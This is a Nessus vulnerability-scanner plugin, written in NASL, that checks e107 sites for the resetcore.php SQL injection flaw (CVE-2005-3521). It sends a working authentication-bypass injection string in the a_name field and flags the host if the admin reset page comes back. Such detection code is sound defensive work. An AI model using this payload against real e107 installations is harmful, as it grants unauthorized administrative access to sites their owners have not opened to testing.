#
#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#  Ref: rgod
#  This script is released under the GNU GPL v2
#


include("compat.inc");

if(description)
{
 script_id(20069);
 script_version("$Revision: 1.11 $");

 script_cve_id("CVE-2005-3521");
 script_bugtraq_id(15125);
 script_xref(name:"OSVDB", value:"20070");

 script_name(english:"e107 resetcore.php user Field SQL Injection");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running e107, a web content management
system written in PHP. 

There is a flaw in the version of e107 on the remote host such that
anyone can injection SQL commands through the 'resetcore.php' script
and gain administrative access trivially." );
 script_set_attribute(attribute:"see_also", value:"http://retrogod.altervista.org/e107remote.html" );
 script_set_attribute(attribute:"see_also", value:"https://sourceforge.net/project/shownotes.php?release_id=364570" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to e107 version 0.6173 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );

script_end_attributes();

 
 summary["english"] = "e107 SQL Injection";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2005-2009 David Maciejak");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("e107_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

# Check starts here

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if (!can_host_php(port:port) ) exit(0);

host = get_host_name();
variables = "a_name='%27+or+isnull%281%2F0%29%2F*&a_password=nessus&usubmit=Continue";  


# Test an install.
install = get_kb_item(string("www/", port, "/e107"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];
  url = string(dir, "/e107_files/resetcore.php");

  # Make sure the script exists.
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does...
  if (egrep(pattern:"<input [^>]*name='a_(name|password)'", string:res)) {
    req = string("POST ",url , " HTTP/1.1\r\n", 
	      "Referer: http://", host, ":", port, req, "\r\n",  
  	      "Host: ", host, ":", port, "\r\n", 
	      "Content-Type: application/x-www-form-urlencoded\r\n", 
	      "Content-Length: ", strlen(variables), "\r\n\r\n", variables);

    buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if(buf == NULL)exit(0);

    if ("Reset core to default values" >< buf && "e107 resetcore></title>" >< buf)
    {
	security_hole(port);
	set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
	exit(0);
    }
  } 
}

